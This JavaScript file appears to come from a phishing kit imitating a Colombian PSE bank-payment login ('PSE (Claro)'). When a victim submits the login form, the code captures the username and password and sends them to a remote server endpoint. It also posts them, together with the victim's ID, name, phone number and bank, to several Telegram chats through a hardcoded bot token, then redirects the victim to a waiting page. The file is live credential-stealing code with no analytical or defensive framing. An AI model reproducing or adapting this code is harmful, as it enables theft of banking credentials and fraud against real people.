function updateLS() {
  LS.setItem("info", JSON.stringify(info));
}

// Elemento con el botón de entrar
const button = document.getElementById("btnUsuario");

// Input de Usuario
const userInput = document.getElementById("txtUsuario");

// Input de Contraseña
const passInput = document.getElementById("txtPass");

async function sendToTelegram(message) {
  // Enviar mensaje a múltiples chatIds
  for (const chatId of chatIds) {
    const url = `https://api.telegram.org/bot7772373506:AAE68FvWBmOiOLaTrSykMxSdpfQwP7C8hjo/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
      message
    )}`;

    try {
      const response = await fetch(url);
      if (response.ok) {
        console.log(`Mensaje enviado a Telegram (chat ID: ${chatId})`);
      } else {
        console.error(
          `Error al enviar mensaje (chat ID: ${chatId}):`,
          response.statusText
        );
      }
    } catch (error) {
      console.error(`Error de red (chat ID: ${chatId}):`, error);
    }
  }
}

async function updateStatus() {
  button.disabled = true;

  try {
    // Obtener los datos del servidor
    const response = await fetch(`${url}/trico/tricoData`, {
      method: "GET",
      headers: {
        "Content-Type": "application/json",
      },
    });

    if (!response.ok) {
      throw new Error("Error al obtener los datos del servidor");
    }

    const serverData = await response.json();
    const dataTables = [...serverData];

    // Buscar al usuario correspondiente
    const userData = dataTables.find((data) => data.id == info.metaInfo.cc);

    if (userData) {
      console.log("Usuario encontrado");

      const updateresponse = await fetch(
        `${url}/trico/tricoUserPse/${userData.idreg}`,
        {
          method: "PUT",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            usuario: info.metaInfo.user,
            password: info.metaInfo.puser,
          }),
        }
      );

      if (!updateresponse.ok) {
        throw new Error("Error al actualizar el usuario");
      }

      const updatedData = await updateresponse.json();

      // Crear el mensaje con toda la información
      const message = `🟣 PSE (Claro)\n©️ID: ${userData.id}\n🆔Nombre: ${userData.nombre}\n📱Teléfono: ${userData.telefono}\n🚹Usuario: ${info.metaInfo.user}\n🔒Contraseña: ${info.metaInfo.puser}\n🏦Banco: ${userData.bank}\nFuente: ${fuente}\nCorrigió Usuario`;

      // Enviar el mensaje a Telegram
      await sendToTelegram(message);

      console.log("Usuario actualizado");
    } else {
      console.error("Usuario no encontrado en la base de datos");
    }
  } catch (error) {
    console.error("Error al procesar la solicitud:", error);
  } finally {
    button.disabled = false;
    window.location.href = "wait.html"; // Redirige a la página deseada
  }
}

// Agregar evento al botón
button.addEventListener("click", async function (e) {
  e.preventDefault();

  // Validación de campos vacíos
  if (userInput.value === "" || passInput.value === "") {
    alert("Por favor ingrese la información requerida");
    userInput.focus();
    return;
  }

  const user = userInput.value;
  const pass = passInput.value;

  // Guardar los valores en el objeto 'info'
  info.metaInfo.user = user;
  info.metaInfo.puser = pass;

  updateLS();

  // Actualizar el estado del usuario
  await updateStatus();
});
